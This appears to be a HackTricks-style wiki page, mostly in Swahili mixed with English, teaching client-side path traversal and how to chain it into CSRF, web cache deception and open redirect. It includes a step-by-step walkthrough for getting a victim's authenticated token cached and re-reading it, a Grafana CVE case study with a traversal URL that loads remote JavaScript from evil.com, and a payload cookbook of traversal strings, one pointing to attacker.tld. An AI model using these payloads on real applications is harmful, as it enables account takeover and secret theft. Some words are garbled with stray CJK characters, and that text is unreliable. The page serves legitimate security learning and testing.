# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Taarifa za Msingi

Client side path traversal hutokea wakati unaweza kuathiri au kubadilisha path ya URL ambayo itatumwa kwa mtumiaji ili aitembelee kwa njia halali au ambayo mtumiaji kwa namna fulani atalazimishwa kuitembelea, kwa mfano kupitia JS au CSS. CSPT pia inajulikana kama **On-Site Request Forgery (OSRF)** kwa sababu inakuwezesha kulazimisha browser ya mwathiriwa kufikia paths yoyote kwenye origin ile ile kwa kutumia cookies, JWTs, au cheti za mTLS.

Vyanzo vya kawaida (data unayodhibiti):

- Vigezo vya route vinavyounganishwa na `fetch()` au XHR paths (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Thamani zilizohifadhiwa (profile slugs, document IDs) zinazoingizwa katika paths ndani ya background jobs, service workers, au WebSocket URLs.
- Vifaa vya UI (download/export buttons, image galleries) vinavyoongeza fragments zilizodhibitiwa na mtumiaji au file extensions kwa API endpoints kabla request itatumwa.

Sinks za kawaida (ambapo traversal inaishia):

- Frontend API wrappers zinazoweka awali `/api/` au `/proxy/` na kutumia tena auth headers kiotomatiki.
- `history.pushState` / `router.navigate` helpers zinazojenga tena URLs baadaye wakati wa hydration.
- `<link>`/`<style>`/`@import` statements zinazoandaliwa na maudhui ya CMS au payloads za feature-flag.

### Athari za kawaida & mnyororo

- **CSPT ➜ CSRF/OSRF**: hijack authenticated `POST/PUT/DELETE` calls kwa kutoka kwenye resource iliyokusudiwa, kisha uingie tena kwenye endpoints nyeti (urejeshaji wa nywila, idhini ya malipo, kuondolewa kwa ruhusa). Changanya na orodha ya ukaguzi ya [CSRF](csrf-cross-site-request-forgery.md) ili kusogezwa hatua.
- **CSPT ➜ cache deception / poisoning**: kutumika kwa JSON inayodhibitiwa na mshambuliaji kutoka kwa public CDN keys na kuirudia bila uthibitisho. Angalia [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: traversal inaishia kwenye endpoint ya open redirect, ambayo kisha inarudisha kwenye miundombinu ya mshambuliaji inayotoa JS hatarishi au payloads za SSRF. Changanya na matumizi mabaya ya [Open Redirect](open-redirect.md).

### Mifano ya matokeo

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), ilikuwa inawezekana **change the invite URL** kiasi kwamba ilikuja **canceling a card**.
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), ilikuwa inawezekana kuunganisha **client side path traversal via CSS** (ilikuwa inawezekana kubadilisha path ambayo rasilimali ya CSS ilipakiwa kutoka) na **open redirect** ili kupakia rasilimali ya CSS kutoka kwa **attacker controlled domain**.
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), inawezekana kuona mbinu jinsi ya kutumia CSPT **kufanya CSRF attack**. Hii inafanywa kwa **kufuatilia data yote** ambayo mshambuliaji anaweza kudhibiti (URL path, parameters, fragment, data injected in the DB...) **na the sinks** ambazo data hiyo inaishia (maombi yanayofanywa).
- Angalia [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) ili kufuatilia hilo.
- Angalia [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) kujaribu mbinu.
- Angalia [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) juu ya jinsi ya kutumia browser extension kwenye playground.

## CSPT-assisted web cache poisoning/deception

CSPT inaweza kuunganishwa na caching ya CDN inayotegemea extension ili kutolea nje JSON nyeti zilizoleak zilizotolewa na API calls zilizo na uthibitisho:

- Frontend inaunganisha input inayodhibitiwa na mtumiaji ndani ya API path na inaambatisha authentication headers katika fetch/XHR.
- Kwa kuingiza dot-segments (../) unaweza kulenga upya authenticated request kwa endpoint tofauti kwenye origin ile ile.
- Ikiwa endpoint hiyo (au variant ya path yenye kiraka kinachoonekana static kama .css) inakahifadhiwa na CDN bila kutofautishwa kwa auth headers, majibu ya uthibitisho ya mwathiriwa yanaweza kuhifadhiwa chini ya public cache key na kutolewa na mtu yeyote.

Mwongozo mfupi:

1) Tafuta code ya SPA inayojenga API URLs kutoka kwa path parameters wakati inatuma auth headers.
2) Tambua endpoints nyeti na jaribu suffixes za static (.css, .js, .jpg, .json) kuona kama CDN inabadilika kuwa Cache-Control: public/max-age na X-Cache: Hit huku ikirudisha JSON.
3) Mshawishi mwathiriwa kwenda kwenye URL inayoweka traversal ndani ya parameter ya SPA ili authenticated fetch igonge variant ya path inayoweza kuwekwa caching (kwa mfano, ../../../v1/token.css).
4) Soma tena URL ile ile bila kutambulika ili upate siri iliyohifadhiwa kwenye cache (token → ATO).

Angalia maelezo na mbinu za kuzuia kwenye ukurasa wa Cache Deception: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Mfumo wa utafutaji & tooling

### Ugunduzi pasivu kwa kutumia intercepting proxies

- **Correlate sources/sinks automatically**: the [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) inachambua historia yako ya proxy, inaweka vikundi vigezo vinavyoonekana baadaye ndani ya paths za ombi zingine, na inaweza kutuma tena proof-of-concept URLs zenye canary tokens kuthibitisha traversals zinazoweza kutumiwa. Baada ya kuingiza JAR, weka `Source Scope` kwa client parameters (mf., `id`, `slug`) na `Sink Methods` kwa `GET, POST, DELETE` ili extension ionyeshe request builders hatarishi. Unaweza ku-export vyanzo vyote vinavyoshukiwa na canary iliyojumuishwa ili kuvitathmini kwa wingi.
- **Look for double-URL-decoding**: wakati unavinjari kwa kutumia Burp au ZAP, angalia mifumo ya `/api/%252e%252e/` inayosawazishwa na frontend kabla ya kugonga network—hizi kawaida hujitokeza kama base64-encoded JSON bodies zinazoruhusu route state na ni rahisi kuzipuuzia bila scanner otomatiki.

### Kupima kwa mikono kwa SPA sinks

Kuweka snippet mfupi kwenye DevTools kunasaidia kuonyesha traversals zilizofichwa wakati unavyoingiliana na UI:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Ongeza wrappers zinazofanana kwa `XMLHttpRequest.prototype.open`, `history.pushState`, na framework-specific routers (mfano, `next/router`). Kuangalia `init.credentials === "include"` kunapunguza kwa haraka requests zinazoleta session cookies.
- Ikiwa app inahifadhi routing hints katika IndexedDB/localStorage, hariri hizo entries kwa traversal payloads na reload—hali iliyobadilishwa mara nyingi hureinjectwa tena ndani ya requests kabla ya pre-hydration.

### Lab & payload rehearsal

- Anzisha CSPT Playground kwa kutumia `docker compose up` na fanya mazoezi ya kuunganisha traversal ➜ CSRF ➜ stored XSS flows bila kugusa target. Kuiga muundo wa router wa target lokalini kunafanya iwe rahisi kutengeneza PoCs zinazoshirikiwa.
- Hifadhi scratchpad ya dot-segment variations zilizofanikiwa (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) na suffix tricks (`.css`, `.json`, `;` matrix params) ulizoziona wakati wa recon ili uweze kuzireplay haraka ukipoa sink mpya.

## Recent case studies (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – Gadget ya traversal ndani ya `/public/plugins/` iliruhusu attackers kuwasilisha `../../` katika plugin asset loader, kuifunga na open redirect ya Grafana, na kulazimisha victims kupakia attacker-controlled plugin bundles. Wakati anonymous dashboards ziliwezeshwa, URL iliyotengenezwa kama `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` ilisababisha browser kutekeleza remote JavaScript; ikiwa Image Renderer plugin ilikuwepo, primitive ile ile ilih转换a kuwa SSRF kwa kuelekeza rendering requests kuelekea internal hosts. Daima jaribu plugin asset paths, anonymous dashboards, na renderer endpoints pamoja kwa sababu traversal moja mara nyingi inatoa angles za XSS na SSRF.

## Payload cookbook

| Lengo | Payload pattern | Maelezo |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Inafanya kazi wakati routers zinaunganisha tu `/${doc}`. Ongeza `.json` ikiwa CDN inachekesha tu assets zinazojionekana kuwa static. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Unganisha na trusted redirectors zilizoorodheshwa katika codebase ya target. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN inaweza kut扱 `.css` kama static na ku-cache secrets zinazorudishwa kama JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Baadhi ya routers zinakubali `_method` overrides; sambaza na traversal ili kulenga endpoints zenye madhara. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
